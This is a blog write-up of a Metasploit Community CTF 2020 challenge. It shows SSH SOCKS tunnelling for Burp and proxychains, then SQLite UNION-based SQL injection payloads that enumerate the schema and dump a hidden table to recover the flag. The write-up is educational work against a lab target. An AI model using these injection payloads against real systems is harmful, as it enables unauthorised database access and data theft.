---
layout: post
title: WRITE UP - Metasploit Community CTF 2020 - 2 of Spades
date: 2022-02-19
---

# Writeup - Metasploit Community CTF 2020 - 2 of Spades

**This article was initially published in my former blog on the 19th of December 2020**

## Setting up the attacking machine

### Access through a browser and use of Burp or another proxy

I wanted to explain the set up in details because i really think it is useful for any one who would like to play CTF and access the target through a browser when the connexion to the attacking machine is made with ssh.

So this introduction aims to be userful for any CTF or even as a daily practice at your job.

You will have to use -D et -C while launching the command

```
sudo ssh -C -i metasploit_ctf_kali_ssh_key.pem kali@<REMOTE-IP> -D 4444
```

-D specify the local port you wish to use for forwarding

-C is the Compression

-i to specify the location of the key file 

Then we need to set up burp under the User options tab (it can also be made under Project options, it depends if you wish to keep permanently or just for a specific project).  

![Burp Setup](/img/burp-metasploitctf-2020.png){: width="500" }  

Then you can configure your browser proxy as it is usually done when you use Burpsuite (note: this picture is of [foxyproxy](https://web.archive.org/web/20210411045400/https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) a browser add on that i would recommend to anyone who often works on Web Pentest):  
![Proxy Settings in browser](/img/proxy-set-up-metasploitctf-2020.png){: width="500" }  

### Proxychains

For this CTF my team mate CptButtStuff was using proxychains which is an amazing tool to launch a local program.

Here is how to set it up:  

Open a new tab and run ssh again as follow using another port than the one you used for burp:
```
sudo ssh -i metasploit_ctf_kali_ssh_key.pem kali@<REMOTE-IP> -D 5555
```

Edit the proxychains conf file `/etc/proxychains.conf`:  

```
socks5          127.0.0.1 5555
```

And then you can launch a program you wish using proxychains (here i am using nmap):

```
proxychains nmap <IP-ADDRESS>
```

### Cool! But how can i get file from the remote host to my local machine?

You can use scp as follow:
```
scp -i private_key.pem username@remote:/path/to/file /local/dir
```

## The Challenge

Now that we have a set up ready (and not only for this chal 😀 ) we can work on 2 of spades

On port 9001 the service was http (see below the extract of my nmap scan)
```
9001/tcp open  http        Thin httpd
|_http-server-header: thin
```

When we browse to this page we get a form:  

![Form](/img/form-metasploitctf-2020.png){: width="500" }  

One of the first thing that comes in mind with a form is sql injection so i tried this, and got a nice error disclosing plenty of info:

```
' Union select 1, 2 --
```

![SQL Injection](/img/sqli-metasploitctf-2020.png){: width="500" }  

This basically means that we need to try to add another col 

And there we go:  
![SQL Injection working payload](/img/sqli-woring-payload-metasploitctf-2020.png){: width="500" }  

Now that we know that the backend DB is sqlite let’s find cool payloads to dump the database:

- [SQLite SQLI Cheat Sheet - Unicorn as Fuel](https://github.com/unicornsasfuel/sqlite_sqli_cheat_sheet)

|   |   |
|---|---|
| Table name enumeration | SELECT name FROM sqlite_master WHERE type=’table’ |  
| Table schema enumeration | SELECT sql FROM sqlite_master WHERE type=’table’ |  
|   |   |
 
*Chosen Payloads*  
I used this one and got the schema of the table
```
' Union SELECT null, null, sql FROM sqlite_master WHERE type='table' --
```
![Schema of the table](/img/schema-table-metasploitctf-2020.png){: width="500" }  

The first line is exactly the one we need so now we can query the information we need to get the flag:

```
' Union SELECT 1, flag, link from hidden --
```

![Get the flag](/img/flag-metasploitctf-2020.png){: width="500" }  

And there we have our flag we just need to wget our png file and md5sum it to get the flag:

```
wget http://<IP>/eGHaMBu2XWvRA5cu/2_of_spades.png
md5sum 2_of_spades.png
```

![Image of the flag](/img/img-flag-metasploitctf-2020.png){: width="500" }  